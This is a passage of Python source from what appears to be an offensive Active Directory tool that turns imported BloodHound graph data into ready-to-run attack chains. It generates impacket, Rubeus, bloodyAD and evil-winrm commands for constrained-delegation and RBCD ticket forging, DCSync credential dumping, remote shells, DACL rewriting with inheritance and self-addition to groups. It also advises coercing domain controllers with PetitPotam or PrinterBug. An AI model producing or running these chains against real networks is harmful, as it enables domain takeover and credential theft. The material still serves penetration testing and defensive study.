        if pe["source_sid"] in idx and pe["target_sid"] in idx:
            edges.append({
                "id": "planned:%s:%s" % (pe["source_sid"], pe["target_sid"]),
                "source": idx[pe["source_sid"]],
                "target": idx[pe["target_sid"]],
                "sourceSid": pe["source_sid"],
                "targetSid": pe["target_sid"],
                "right": pe["right"],
                "abusable": True,
                "planned": True,
            })
    return {
        "nodes": nodes,
        "edges": edges,
        "totalNodes": len(node_rows),
        "totalEdges": len(edge_rows),
        "focus": focus,
        "relationMode": rel,
        "chained": bool(depths),
    }


def search_nodes(domain_id, q):
    q = f"%{(q or '').strip()}%"
    con = db()
    rows = con.execute(
        """
        SELECT sid,label,type,high_value,owned FROM nodes
        WHERE domain_id=? AND (label LIKE ? OR sid LIKE ?)
        ORDER BY owned DESC, high_value DESC, label ASC
        LIMIT 50
        """,
        (domain_id, q, q),
    ).fetchall()
    con.close()
    return [
        {"id": r["sid"], "label": r["label"], "type": r["type"], "highValue": bool(r["high_value"]), "owned": bool(r["owned"])}
        for r in rows
    ]


def domain_dc(con, domain_id):
    """The domain controller, straight from the graph — there is no reason to make
    the operator type a hostname the import already knows. Its IP is the one thing
    BloodHound never collects, so that stays a field."""
    for row in con.execute(
        "SELECT sid,label,props FROM nodes WHERE domain_id=? AND type='Computer'", (domain_id,)
    ):
        props = props_of(row, "props")
        if is_dc_node(row["label"], props):
            return {"sid": row["sid"], "label": row["label"], "fqdn": (row["label"] or "").lower()}
    return None


def domain_stats(domain_id):
    con = db()
    by_type = con.execute(
        "SELECT type, COUNT(*) count FROM nodes WHERE domain_id=? GROUP BY type ORDER BY count DESC",
        (domain_id,),
    ).fetchall()
    row = con.execute(
        """
        SELECT
          SUM(high_value) high_value,
          SUM(owned) owned,
          COUNT(*) nodes
        FROM nodes WHERE domain_id=?
        """,
        (domain_id,),
    ).fetchone()
    edge = con.execute(
        """
        SELECT
          SUM(abusable) abusable,
          COUNT(*) edges
        FROM edges WHERE domain_id=?
        """,
        (domain_id,),
    ).fetchone()
    rights = con.execute(
        """
        SELECT right_name, COUNT(*) count
        FROM edges
        WHERE domain_id=? AND abusable=1
        GROUP BY right_name
        ORDER BY count DESC
        LIMIT 8
        """,
        (domain_id,),
    ).fetchall()
    dc = domain_dc(con, domain_id)
    con.close()
    return {
        "dc": dc,
        "nodes": row["nodes"] or 0,
        "edges": edge["edges"] or 0,
        "abusable": edge["abusable"] or 0,
        "highValue": row["high_value"] or 0,
        "owned": row["owned"] or 0,
        "types": [dict(r) for r in by_type],
        "rights": [dict(r) for r in rights],
    }


def node_detail(domain_id, sid):
    con = db()
    node = con.execute("SELECT * FROM nodes WHERE domain_id=? AND sid=?", (domain_id, sid)).fetchone()
    if not node:
        con.close()
        return None
    outgoing = con.execute(
        """
        SELECT e.*, n.label target_label, n.type target_type, n.props target_props
        FROM edges e JOIN nodes n ON n.domain_id=e.domain_id AND n.sid=e.target_sid
        WHERE e.domain_id=? AND e.source_sid=?
        ORDER BY e.abusable DESC, e.right_name ASC LIMIT 120
        """,
        (domain_id, sid),
    ).fetchall()
    incoming = con.execute(
        """
        SELECT e.*, n.label source_label, n.type source_type
        FROM edges e JOIN nodes n ON n.domain_id=e.domain_id AND n.sid=e.source_sid
        WHERE e.domain_id=? AND e.target_sid=?
        ORDER BY e.abusable DESC, e.right_name ASC LIMIT 120
        """,
        (domain_id, sid),
    ).fetchall()
    domain = (con.execute("SELECT name FROM domains WHERE id=?", (domain_id,)).fetchone()["name"] or "").lower()
    direct_pairs = {(key(e["right_name"]), e["target_sid"]) for e in outgoing if e["abusable"]}
    delegated = group_delegated(con, domain_id, sid, node["label"], domain, direct_pairs)
    deleg_ctx = delegation_context(con, domain_id)
    con.close()
    try:
        props = json.loads(node["props"] or "{}")
    except Exception:
        props = {}

    actor = principal_name(node["label"], props)

    def _abuse(edge):
        """Delegation edges get a chain derived from the real object properties —
        the right SPN, the right impersonation target, and the RBCD detour when
        protocol transition is off. Everything else uses the generic map."""
        right = key(edge["right_name"])
        if right not in ("allowedtodelegate", "allowedtoact"):
            return edge_abuse(edge, actor, domain, src_dn=node_dn(props))
        try:
            tprops = json.loads(edge["target_props"] or "{}")
        except Exception:
            tprops = {}
        if right == "allowedtodelegate":
            cmds, _, _, _, _ = delegation_abuse(
                sid, actor, props, edge["target_label"], edge["target_type"], tprops, domain, deleg_ctx)
        else:
            cmds, _, _, _ = rbcd_abuse(
                actor, props, edge["target_label"], edge["target_type"], tprops, domain, deleg_ctx)
        return cmds

    return {
        "id": node["sid"],
        "groupDelegated": delegated,
        "delegation": delegation_summary(sid, node["label"], props, outgoing, incoming, domain, deleg_ctx),
        "label": node["label"],
        "type": node["type"],
        "highValue": bool(node["high_value"]),
        "owned": bool(node["owned"]),
        "props": props,
        "outgoingCount": len(outgoing),
        "incomingCount": len(incoming),
        "outgoing": [
            {
                "target": e["target_sid"],
                "targetLabel": e["target_label"],
                "targetType": e["target_type"],
                "right": e["right_name"],
                "abusable": bool(e["abusable"]),
                "abuse": _abuse(e),
                **_edge_esc(e),
            }
            for e in outgoing
        ],
        "incoming": [
            {
                "source": e["source_sid"],
                "sourceLabel": e["source_label"],
                "sourceType": e["source_type"],
                "right": e["right_name"],
                "abusable": bool(e["abusable"]),
            }
            for e in incoming
        ],
    }


def abuse_for(right, src, dst, domain, src_dn="", dst_dn=""):
    rows = ABUSE.get(key(right), [])
    src_short = short_name(src)
    dst_short = short_name(dst)
    # {dstfqdn}/{DOMAIN} let a template emit a real Kerberos target: SPNs and ccache
    # names need the FQDN and the upper-case realm, not the short label.
    dst_fqdn = (dst or "").split("@")[0].lower() or dst_short.lower()
    # {srcdn}/{dstdn}: bloodyAD, dacledit and owneredit resolve a distinguishedName
    # unambiguously, while a bare name fails outright on an OU or a Container and
    # can pick the wrong object when names collide. Fall back to the short name
    # only when the import carried no DN.
    return [
        {
            "os": row["os"],
            "tool": row["tool"],
            # Which identity this command authenticates as. Credentials are held
            # per principal, not globally: one chain can legitimately run as two
            # different accounts (the delegating account and the RBCD bridge).
            "as": src_short,
            "cmd": row["cmd"].format(
                src=src_short, dst=dst_short, domain=domain,
                dstfqdn=dst_fqdn, DOMAIN=(domain or "").upper(),
                srcdn=src_dn or src_short, dstdn=dst_dn or dst_short,
            ),
        }
        for row in rows
    ]


def node_dn(props):
    return ((props or {}).get("distinguishedname") or "").strip()


def principal_name(label, props):
    """BloodHound labels objects OOREND@REBOUND.HTB; what every tool wants on the
    command line is the sAMAccountName (oorend, DC01$). Use it when the import
    carried one."""
    return ((props or {}).get("samaccountname") or "").strip() or short_name(label)


def props_of(row, field):
    try:
        return json.loads(row[field] or "{}") if field in row.keys() else {}
    except Exception:
        return {}


# ---------------------------------------------------------------------------
#  Kerberos delegation
#
#  BloodHound draws AllowedToDelegate and stops there. What an operator actually
#  needs is (a) WHICH SPN the edge allows, (b) whether protocol transition is on,
#  and (c) when it is OFF, the RBCD + `-additional-ticket` detour that turns the
#  edge into a usable ticket — S4U2Self alone returns a NON-forwardable ticket, so
#  the naive `getST -impersonate Administrator` dies on KDC_ERR_BADOPTION. That
#  whole chain is derived here from the object's own properties.
# ---------------------------------------------------------------------------


def spn_host(spn):
    """'http/dc01.corp.local:1433/inst' -> 'dc01.corp.local'."""
    spn = (spn or "").strip()
    if "/" not in spn:
        return ""
    return spn.split("/", 1)[1].split("/", 1)[0].split(":", 1)[0].strip().lower()


def spn_class(spn):
    return (spn or "").split("/", 1)[0].strip().lower()


def spn_targets(spn, label):
    """Does this SPN point at the node labelled `label`? BloodHound labels computers
    as an upper-case FQDN and users as NAME@DOMAIN, so compare the full host and
    then the first DNS label."""
    host = spn_host(spn)
    lbl = (label or "").lower().split("@", 1)[0]
    if not host or not lbl:
        return False
    return host == lbl or host.split(".", 1)[0] == lbl.split(".", 1)[0]


def ccache_of(user, spn, domain):
    """The exact filename impacket-getST writes, so the next command can name it."""
    return "{}@{}@{}.ccache".format(user, (spn or "").replace("/", "_"), (domain or "").upper())


def is_dc_node(label, props):
    """A DC: sits in the Domain Controllers OU, or carries the GC/ SPN."""
    p = props or {}
    dn = (p.get("distinguishedname") or "").upper()
    if "OU=DOMAIN CONTROLLERS" in dn:
        return True
    return any(spn_class(x) in ("gc", "drsuapi") for x in (p.get("serviceprincipalnames") or []))


def _cred_args(sam):
    """impacket credential syntax for a principal. Machine and gMSA accounts are
    driven by their NT hash; a normal user by a password."""
    if sam.endswith("$"):
        return "'{dom}/" + sam + "' -hashes :<nt-hash>"
    return "'{dom}/" + sam + ":<pass>'"


def delegation_context(con, domain_id):
    """The two facts the chain hinges on and that no BloodHound edge carries:
    a principal you can drive S4U with (RBCD requires the delegating principal to
    own an SPN), and whether the built-in Administrator is NOT_DELEGATED
    (`sensitive`) — which decides who you are allowed to impersonate at all."""
    candidates = []
    privileged = []      # worth impersonating
    computers = {}       # label -> node, to resolve a target host to its machine account
    admin_sensitive = False
    # Protected Users cannot be delegated either, whatever their own flags say.
    protected = {
        r["source_sid"] for r in con.execute(
            """
            SELECT e.source_sid FROM edges e JOIN nodes n
              ON n.domain_id=e.domain_id AND n.sid=e.target_sid
            WHERE e.domain_id=? AND e.right_name='MemberOf'
              AND upper(n.label) LIKE 'PROTECTED USERS%'
            """,
            (domain_id,),
        )
    }
    for row in con.execute(
        "SELECT sid,label,type,owned,high_value,props FROM nodes WHERE domain_id=?", (domain_id,)
    ):
        try:
            props = json.loads(row["props"] or "{}")
        except Exception:
            continue
        if row["sid"].endswith("-500"):
            admin_sensitive = bool(props.get("sensitive"))
        if row["type"] == "Computer":
            computers[(row["label"] or "").lower()] = {
                "sid": row["sid"], "label": row["label"], "type": "Computer", "props": props,
            }
        # An account is worth impersonating if it is privileged; it is delegable
        # unless it is marked sensitive (NOT_DELEGATED) or sits in Protected Users.
        if row["type"] == "User" and (props.get("admincount") or row["high_value"] or row["sid"].endswith("-500")):
            if props.get("enabled") is False or row["sid"].endswith(("-501", "-502")):
                continue
            blocked = "sensitive (NOT_DELEGATED)" if props.get("sensitive") else (
                "member of Protected Users" if row["sid"] in protected else "")
            privileged.append({
                "sid": row["sid"],
                "name": props.get("samaccountname") or short_name(row["label"]),
                "label": row["label"], "type": "User", "blocked": blocked,
            })
        spns = [x for x in (props.get("serviceprincipalnames") or []) if x]
        if not spns or row["type"] not in ("User", "Computer"):
            continue
        # krbtgt (-502) and Guest (-501) carry SPNs but you can never drive S4U as
        # them, and a disabled account cannot obtain a TGT at all.
        if row["sid"].endswith(("-502", "-501")) or props.get("enabled") is False:
            continue
        candidates.append({
            "sid": row["sid"],
            "name": props.get("samaccountname") or short_name(row["label"]),
            "label": row["label"],
            "owned": bool(row["owned"]),
            "type": row["type"],
            "spn": spns[0],
        })
    # Prefer something you already own, then a user account (no machine password to
    # source), then alphabetical so the suggestion is stable across reloads.
    candidates.sort(key=lambda c: (0 if c["owned"] else 1, 0 if c["type"] == "User" else 1, c["name"].lower()))
    privileged.sort(key=lambda c: (0 if c["sid"].endswith("-500") else 1, c["name"].lower()))
    return {
        "spnPrincipals": candidates,
        "adminSensitive": admin_sensitive,
        "privileged": privileged,
        "computers": computers,
        "protected": protected,
    }


def impersonation_options(ctx, targets):
    """Who this delegation lets you become, as real graph objects.

    Two groups, and the second matters as much as the first: a privileged account
    flagged `sensitive` or sitting in Protected Users is one the KDC refuses to
    delegate, and not saying so is how you end up debugging KDC_ERR_BADOPTION."""
    ctx = ctx or {}
    can, blocked, seen = [], [], set()
    # The machine account of each host you can delegate to is always delegable, and
    # on a DC it carries the replication rights — that is the DCSync route.
    for t in targets or []:
        node = (ctx.get("computers") or {}).get((t.get("targetLabel") or "").lower())
        if not node or node["sid"] in seen:
            continue
        seen.add(node["sid"])
        why = "the target host's own account"
        if is_dc_node(node["label"], node["props"]):
            why += " — holds the DC replication rights, so this reaches DCSync"
        can.append({"sid": node["sid"], "label": node["label"], "type": "Computer",
                    "name": (node["props"].get("samaccountname") or short_name(node["label"])), "why": why})
    for pr in ctx.get("privileged") or []:
        if pr["sid"] in seen:
            continue
        seen.add(pr["sid"])
        entry = {"sid": pr["sid"], "label": pr["label"], "type": "User", "name": pr["name"]}
        if pr["blocked"]:
            blocked.append({**entry, "why": pr["blocked"]})
        else:
            can.append({**entry, "why": "privileged and delegable"})
    return can[:12], blocked[:12]


def pick_helper(ctx, exclude_sid):
    for cand in (ctx or {}).get("spnPrincipals") or []:
        if cand["sid"] != exclude_sid:
            return cand
    return None


def impersonation_target(ctx, dst_label, dst_type, dst_props):
    """Who to impersonate. Administrator is the obvious pick, but if it is flagged
    `sensitive` (NOT_DELEGATED) the KDC refuses to delegate it — and the target
    host's OWN machine account is the answer: on a DC that identity holds the
    replication rights, so the chain lands straight on DCSync."""
    if not (ctx or {}).get("adminSensitive"):
        return "Administrator", ""
    if dst_type == "Computer":
        machine = (dst_label or "").split(".", 1)[0].split("@", 1)[0].upper() + "$"
        why = "Administrator is flagged sensitive (NOT_DELEGATED), so it cannot be delegated — impersonating {} instead".format(machine)
        if is_dc_node(dst_label, dst_props):
            why += "; that account holds the DC's replication rights, which is what makes the DCSync below work"
        return machine, why + "."
    return "Administrator", "Administrator is flagged sensitive (NOT_DELEGATED); pick a privileged account that is not, or a machine account."


def delegation_payoff(spn, dst_label, dst_props, ccache, domain):
    """What the final ticket is actually good for, picked from the SPN's service
    class and whether the target is a DC."""
    host = spn_host(spn) or (dst_label or "").lower()
    cls = spn_class(spn)
    steps = []
    if is_dc_node(dst_label, dst_props):
        # DRSUAPI runs as the DC's own machine account, and on a DC the HOST SPN
        # aliases (cifs, http, ldap, …) all decrypt with that same key — which is
        # why a ticket for http/<dc> is accepted here.
        steps.append(("DCSync (DRSUAPI)", "KRB5CCNAME=\"$PWD/{}\" impacket-secretsdump -k -no-pass {} -just-dc-user administrator".format(ccache, host)))
    if cls in ("cifs", "host", ""):
        steps.append(("shell over SMB", "KRB5CCNAME=\"$PWD/{}\" impacket-psexec -k -no-pass {}".format(ccache, host)))
    elif cls in ("mssqlsvc", "mssql"):
        steps.append(("MSSQL as the impersonated user", "KRB5CCNAME=\"$PWD/{}\" impacket-mssqlclient -k -no-pass {}".format(ccache, host)))
    elif cls in ("ldap",):
        steps.append(("LDAP as the impersonated user", "KRB5CCNAME=\"$PWD/{}\" bloodyAD -k -d {} --host {} get object 'Administrator'".format(ccache, (domain or "").lower(), host)))
    elif cls in ("http", "www"):
        steps.append(("WinRM over Kerberos", "KRB5CCNAME=\"$PWD/{}\" evil-winrm -i {} -r {}".format(ccache, host, (domain or "").upper())))
    if cls not in ("cifs", "host", ""):
        steps.append((
            "need a different service? swap the class",
            "impacket-getST … -spn '{}' -altservice cifs      # Rubeus: /altservice:cifs — the KDC does not bind the ST to the service class".format(spn),
        ))
    return steps


def delegation_abuse(src_sid, src_label, src_props, dst_label, dst_type, dst_props, domain, ctx):
    """The full, filled-in chain for one AllowedToDelegate edge."""
    p = src_props or {}
    dom = (domain or "").lower()
    sam = p.get("samaccountname") or short_name(src_label)
    cred = _cred_args(sam).format(dom=dom)
    allowed = [x for x in (p.get("allowedtodelegate") or []) if x]
    for_dst = [x for x in allowed if spn_targets(x, dst_label)] or allowed
    spn = for_dst[0] if for_dst else "cifs/{}".format((dst_label or "<target>").split("@", 1)[0].lower())
    own_spns = [x for x in (p.get("serviceprincipalnames") or []) if x]
    who, why = impersonation_target(ctx, dst_label, dst_type, dst_props)
    out = []
    step = [0]

    def add(tool, cmd, os_="linux", numbered=True, runs_as=None):
        if numbered:
            step[0] += 1
            tool = "{} · {}".format(step[0], tool)
        out.append({"os": os_, "tool": tool, "cmd": cmd, "as": runs_as or sam})

    if p.get("trustedtoauth"):
        # Protocol transition on: S4U2Self hands back a forwardable ticket, so one
        # getST does the whole job.
        final = ccache_of(who, spn, domain)
        add("getST (S4U2Self + S4U2Proxy)",
            "impacket-getST {} -spn '{}' -impersonate '{}' -dc-ip <dc-ip>".format(cred, spn, who))
        add("load the ticket", "export KRB5CCNAME=\"$PWD/{}\" && klist".format(final))
        for label, cmd in delegation_payoff(spn, dst_label, dst_props, final, domain):
            add(label, cmd)
        add("Rubeus s4u",
            "Rubeus.exe s4u /user:{} /rc4:<nt-hash> /impersonateuser:{} /msdsspn:{} /altservice:cifs /ptt".format(sam, who, spn),
            "windows", numbered=False)
        return out, spn, who, why, True

    # No protocol transition. S4U2Self returns a ticket WITHOUT the forwardable
    # flag, so S4U2Proxy refuses it (KDC_ERR_BADOPTION). The way through is to have
    # some other principal mint a forwardable ticket for the victim against one of
    # THIS account's own SPNs — which is what RBCD gives you — and then feed that
    # ticket to S4U2Proxy as evidence via -additional-ticket.
    helper = pick_helper(ctx, src_sid)
    helper_name = helper["name"] if helper else "<principal-with-spn>"
    helper_cred = (_cred_args(helper_name).format(dom=dom) if helper else "'{}/<principal-with-spn>:<pass>'".format(dom))
    bridge_spn = own_spns[0] if own_spns else "<spn-of-{}>".format(sam)
    evidence = ccache_of(who, bridge_spn, domain)
    final = ccache_of(who, spn, domain)

    add("confirm the delegation flavour",
        "impacket-findDelegation {} -k -dc-ip <dc-ip>   # expect: Constrained w/o Protocol Transition → {}".format(cred, spn))
    add("TGT for {}".format(sam),
        "impacket-getTGT {} -dc-ip <dc-ip>  &&  export KRB5CCNAME=\"$PWD/{}.ccache\"".format(cred, sam))
    add("RBCD: let {} act on behalf of others toward {}".format(helper_name, sam),
        "impacket-rbcd {} -k -delegate-from '{}' -delegate-to '{}' -action write -dc-ip <dc-ip> -use-ldaps".format(cred, helper_name, sam))
    add("evidence ticket via RBCD — this one IS forwardable",
        "impacket-getST {} -spn '{}' -impersonate '{}' -dc-ip <dc-ip>".format(helper_cred, bridge_spn, who),
        runs_as=helper_name)
    add("S4U2Proxy with -additional-ticket (skips the non-forwardable S4U2Self)",
        "impacket-getST {} -spn '{}' -impersonate '{}' -additional-ticket '{}' -dc-ip <dc-ip>".format(cred, spn, who, evidence))
    add("load the ticket", "export KRB5CCNAME=\"$PWD/{}\" && klist -e".format(final))
    for label, cmd in delegation_payoff(spn, dst_label, dst_props, final, domain):
        add(label, cmd)
    add("clean up the RBCD you wrote",
        "impacket-rbcd {} -k -delegate-from '{}' -delegate-to '{}' -action remove -dc-ip <dc-ip> -use-ldaps".format(cred, helper_name, sam))
    add("Rubeus (same chain)",
        "Rubeus.exe s4u /user:{} /rc4:<nt-hash> /impersonateuser:{} /msdsspn:{} /tgs:<base64-evidence-ticket> /ptt".format(sam, who, spn),
        "windows", numbered=False)
    return out, spn, who, why, False


def rbcd_abuse(src_label, src_props, dst_label, dst_type, dst_props, domain, ctx):
    """An AllowedToAct edge: RBCD is already written, `src` may impersonate anyone
    toward any service of `dst`."""
    p = src_props or {}
    dom = (domain or "").lower()
    sam = p.get("samaccountname") or short_name(src_label)
    cred = _cred_args(sam).format(dom=dom)
    host = (dst_label or "").split("@", 1)[0].lower()
    dprops = dst_props or {}
    dst_spns = [x for x in (dprops.get("serviceprincipalnames") or []) if x]
    spn = next((x for x in dst_spns if spn_class(x) == "cifs"), None) or "cifs/{}".format(host)
    who, why = impersonation_target(ctx, dst_label, dst_type, dst_props)
    final = ccache_of(who, spn, domain)
    out = [
        {"os": "linux", "as": sam, "tool": "1 · getST (S4U2Self + S4U2Proxy)",
         "cmd": "impacket-getST {} -spn '{}' -impersonate '{}' -dc-ip <dc-ip>".format(cred, spn, who)},
        {"os": "linux", "as": sam, "tool": "2 · load the ticket", "cmd": "export KRB5CCNAME=\"$PWD/{}\" && klist".format(final)},
    ]
    for n, (label, cmd) in enumerate(delegation_payoff(spn, dst_label, dst_props, final, domain), start=3):
        out.append({"os": "linux", "as": sam, "tool": "{} · {}".format(n, label), "cmd": cmd})
    out.append({"os": "windows", "as": sam, "tool": "Rubeus s4u",
                "cmd": "Rubeus.exe s4u /user:{} /rc4:<nt-hash> /impersonateuser:{} /msdsspn:{} /ptt".format(sam, who, spn)})
    return out, spn, who, why


def delegation_summary(sid, label, props, outgoing, incoming, domain, ctx):
    """The delegation card: which flavour is configured, the exact SPNs this object
    may delegate to (and to which object each one resolves), and who may act on its
    behalf. Returns None for objects that take no part in delegation."""
    p = props or {}
    allowed = [x for x in (p.get("allowedtodelegate") or []) if x]
    own_spns = [x for x in (p.get("serviceprincipalnames") or []) if x]
    unconstrained = bool(p.get("unconstraineddelegation"))
    proto = bool(p.get("trustedtoauth"))
    actors = [e for e in incoming if key(e["right_name"]) == "allowedtoact"]
    targets = [e for e in outgoing if key(e["right_name"]) == "allowedtodelegate"]

    if unconstrained:
        kind = "Unconstrained delegation"
        note = "Every TGT presented to this host is cached in its LSASS. Coerce a DC to authenticate (PetitPotam / PrinterBug), dump the TGT and replay it."
    elif allowed and proto:
        kind = "Constrained delegation — with protocol transition"
        note = "TrustedToAuthForDelegation is set, so S4U2Self returns a FORWARDABLE ticket: a single getST reaches the allowed SPNs as any non-sensitive user."
    elif allowed:
        kind = "Constrained delegation — without protocol transition"
        note = ("TrustedToAuthForDelegation is NOT set: S4U2Self hands back a non-forwardable ticket and S4U2Proxy "
                "rejects it (KDC_ERR_BADOPTION). You need an evidence ticket first — write RBCD toward this account, "
                "mint a forwardable ticket against one of its own SPNs, then pass it to S4U2Proxy with -additional-ticket.")
    elif actors:
        kind = "Resource-based constrained delegation (RBCD)"
        note = "The principals below are listed in this object's msDS-AllowedToActOnBehalfOfOtherIdentity: each can request a ticket to any of its services as anybody."
    else:
        return None

    resolved = []
    for spn in allowed:
        match = next((e for e in targets if spn_targets(spn, e["target_label"])), None)
        resolved.append({
            "spn": spn,
            "service": spn_class(spn),
            "host": spn_host(spn),
            "target": match["target_sid"] if match else None,
            "targetLabel": match["target_label"] if match else spn_host(spn),
            "targetType": match["target_type"] if match else "",
        })
    # An AllowedToDelegate edge whose SPN we could not line up still belongs on the card.
    for e in targets:
        if not any(r["target"] == e["target_sid"] for r in resolved):
            resolved.append({"spn": "", "service": "", "host": "",
                             "target": e["target_sid"], "targetLabel": e["target_label"],
                             "targetType": e["target_type"]})
    helper = pick_helper(ctx, sid)
    can_imp, blocked_imp = impersonation_options(ctx, resolved)
    # The route, in order. Without protocol transition you cannot go straight from
    # here to the target: the bridge account is what mints the forwardable ticket.
    route = []
    if allowed and not proto and not unconstrained:
        if helper:
            route.append({"sid": helper["sid"], "label": helper["name"], "type": helper["type"],
                          "step": "bridge — you grant it RBCD toward this object, then it mints a forwardable ticket"})
        route.append({"sid": sid, "label": principal_name(label, p), "type": "User",
                      "step": "replays that ticket through S4U2Proxy (-additional-ticket)"})
        for c in can_imp[:1]:
            route.append({"sid": c["sid"], "label": c["name"], "type": c["type"],
                          "step": "the identity you end up holding — " + c["why"]})
    return {
        "route": route,
        "canImpersonate": can_imp,
        "blockedImpersonate": blocked_imp,
        "kind": kind,
        "note": note,
        "protocolTransition": proto,
        "unconstrained": unconstrained,
        "ownSpns": own_spns,
        "allowedToDelegate": resolved,
        "allowedToActOnBehalf": [
            {"sid": e["source_sid"], "label": e["source_label"], "type": e["source_type"]}
            for e in actors
        ],
        "helper": helper,
        "adminSensitive": bool((ctx or {}).get("adminSensitive")),
    }


# Full control over an object (any of these ⇒ you can rewrite its DACL / take it over).
CONTROL_RIGHTS = {"genericall", "genericwrite", "writedacl", "writeowner", "owns"}
# Edges that let a principal ACT THROUGH a group: already a member (MemberOf), or
# able to join/seize it (AddSelf/AddMember, or full control over the group object).
GROUP_GAIN = {"memberof", "addself", "addmember"} | CONTROL_RIGHTS
# Containers whose control carries DOWN to the objects they hold (via Contains).
# Domain is excluded on purpose — control there is domain-wide (DCSync-class) and
# would dump every object as a card; it's already surfaced as a direct edge.
CONTAINER_TYPES = {"OU", "Container"}


def gain_commands(chain, actor, actor_dn, domain, ou_dn=None):
    """The steps you must run BEFORE the inherited right is yours.

    An inherited right is never one command. To reach `GenericAll -> winrm_svc`
    through `AddSelf -> ServiceMgmt -> GenericAll -> Service Users OU` you first
    join the group, then rewrite the OU's DACL WITH INHERITANCE so the right
    actually reaches the objects inside it. Showing only the final abuse is what
    makes these cards useless in practice."""
    steps = []
    for hop in chain:
        k = key(hop.get("via"))
        label = short_name(hop.get("group") or "")
        dn = hop.get("groupDn") or hop.get("group") or label
        # A hop is a right the group ALREADY holds — nothing to write. The only
        # hop that costs you a command is joining a group you are not yet in.
        if k in ("addself", "addmember"):
            steps.append(("join {}".format(label),
                          "bloodyAD --host <dc> -d {} -u '{}' -p '<pass>' add groupMember '{}' '{}'".format(
                              domain, actor, dn, actor_dn or actor)))
    if ou_dn:
        # Descendant Object Takeover: without -inheritance the ACE lands on the OU
        # only and none of the objects inside it move.
        steps.append(("extend FullControl down the OU (-inheritance)",
                      "impacket-dacledit {}/'{}':'<pass>' -action write -rights FullControl -inheritance "
                      "-principal '{}' -target-dn '{}' -dc-ip <dc-ip> -use-ldaps".format(domain, actor, actor, ou_dn)))
        steps.append(("same step, bloodyAD",
                      "bloodyAD --host <dc> -d {} -u '{}' -p '<pass>' add genericAll '{}' '{}'".format(
                          domain, actor, ou_dn, actor)))
    return steps


def prelude_cmds(prelude, actor=""):
    """The shared setup as plain command entries. Numbering is left to the caller:
    the same prelude serves every target reached through the same trail, so it is
    rendered once and the per-target steps continue from where it ends."""
    return [{"os": "linux", "as": actor, "tool": label, "cmd": cmd} for label, cmd in prelude]


def prelude_key(chain, ou_dn=""):
    """Identifies a setup. Two targets reached through the same groups and the same
    OU share one setup and must not repeat it."""
    return "|".join("{}:{}".format(key(h.get("via")), h.get("groupSid", "")) for h in chain) + "||" + (ou_dn or "")


def group_delegated(con, domain_id, sid, node_label, domain_name, exclude):
    """Every abusable right a principal ULTIMATELY wields indirectly — through group
    membership AND through control of an OU/Container that holds other objects.

    Walk, transitively from `sid`:
      • group-gain edges (MemberOf / AddSelf / AddMember / full control) into groups,
        then surface each group's abusable outbound rights; and
      • control edges (GenericAll/Write*/Owns) into an OU/Container, then treat every
        object it Contains as a full takeover (the writeup's D.Anderson -GenericAll->
        Marketing OU -Contains-> E.Rodriguez opening).
    Each result carries the trail that grants it. `exclude` is the set of
    (right-key, target-sid) already held DIRECTLY, so nothing is duplicated.
    """
    rows = con.execute(
        """
        SELECT e.source_sid, e.target_sid, e.right_name, n.label tlabel, n.type ttype, n.props tprops
        FROM edges e JOIN nodes n ON n.domain_id=e.domain_id AND n.sid=e.target_sid
        WHERE e.domain_id=?
        """,
        (domain_id,),
    ).fetchall()
    dn_of, name_of = {}, {}
    for r in rows:
        if r["target_sid"] not in dn_of:
            tp = props_of(r, "tprops")
            dn_of[r["target_sid"]] = node_dn(tp)
            name_of[r["target_sid"]] = principal_name(r["tlabel"], tp)
    actor_props = props_of(
        con.execute("SELECT props FROM nodes WHERE domain_id=? AND sid=?", (domain_id, sid)).fetchone() or {}, "props")
    actor = principal_name(node_label, actor_props)
    actor_dn = dn_of.get(sid) or node_dn(actor_props)
    gain = defaultdict(list)          # src -> [(reached_sid, via_right, label, type)]
    contains = defaultdict(list)      # container_sid -> [(child_sid, child_label, child_type)]
    for r in rows:
        k = key(r["right_name"])
        tt = r["ttype"]
        if (tt == "Group" and k in GROUP_GAIN) or (tt in CONTAINER_TYPES and k in CONTROL_RIGHTS):
            gain[r["source_sid"]].append((r["target_sid"], r["right_name"], r["tlabel"], tt))
        if r["right_name"] == "Contains":
            contains[r["source_sid"]].append((r["target_sid"], r["tlabel"], tt))
    reached, seen, stack = {}, {sid}, [(sid, [])]
    while stack:
        cur, chain = stack.pop()
        for tgt, right, tlabel, ttype in gain.get(cur, []):
            if tgt in seen:
                continue
            seen.add(tgt)
            nchain = chain + [{"via": right, "group": tlabel, "groupSid": tgt, "groupDn": dn_of.get(tgt, "")}]
            reached[tgt] = (nchain, ttype)
            stack.append((tgt, nchain))
    if not reached:
        return []
    result, seen_pair = [], set(exclude)
    for tgt, (chain, ttype) in reached.items():
        if ttype == "Group":
            outs = con.execute(
                """
                SELECT e.right_name, e.target_sid, e.props, n.label target_label, n.type ttype,
                       n.props target_props
                FROM edges e JOIN nodes n ON n.domain_id=e.domain_id AND n.sid=e.target_sid
                WHERE e.domain_id=? AND e.source_sid=? AND e.abusable=1
                """,
                (domain_id, tgt),
            ).fetchall()
            for e in outs:
                if e["target_sid"] == sid:
                    continue
                pair = (key(e["right_name"]), e["target_sid"])
                if pair in seen_pair:
                    continue
                seen_pair.add(pair)
                result.append({
                    "target": e["target_sid"], "targetLabel": e["target_label"], "targetType": e["ttype"],
                    "right": e["right_name"], "via": chain,
                    "prelude": prelude_cmds(gain_commands(chain, actor, actor_dn, domain_name), actor),
                    "preludeKey": prelude_key(chain),
                    "abuse": edge_abuse(e, actor, domain_name, src_dn=actor_dn),
                    **_edge_esc(e),
                })
        elif ttype in CONTAINER_TYPES:
            # Controlling the container ⇒ full control over each object it holds.
            ou_dn = dn_of.get(tgt, "")
            prelude = gain_commands(chain, actor, actor_dn, domain_name, ou_dn=ou_dn or None)
            for child_sid, child_label, child_type in contains.get(tgt, [])[:60]:
                if child_sid == sid or child_type in CONTAINER_TYPES:
                    continue
                pair = ("genericall", child_sid)
                if pair in seen_pair:
                    continue
                seen_pair.add(pair)
                result.append({
                    "target": child_sid, "targetLabel": child_label, "targetType": child_type,
                    "right": "GenericAll", "via": chain,
                    "note": "Objects with adminCount=1 do NOT inherit ACEs from their parent OU.",
                    "prelude": prelude_cmds(prelude, actor),
                    "preludeKey": prelude_key(chain, ou_dn),
                    "abuse": abuse_for("GenericAll", actor, name_of.get(child_sid) or child_label, domain_name,
                                       src_dn=actor_dn, dst_dn=dn_of.get(child_sid, "")),
                })
    # Drop the OU-as-a-target card when that same OU is already the setup of the
    # objects inside it: its commands would be a verbatim copy of that setup.
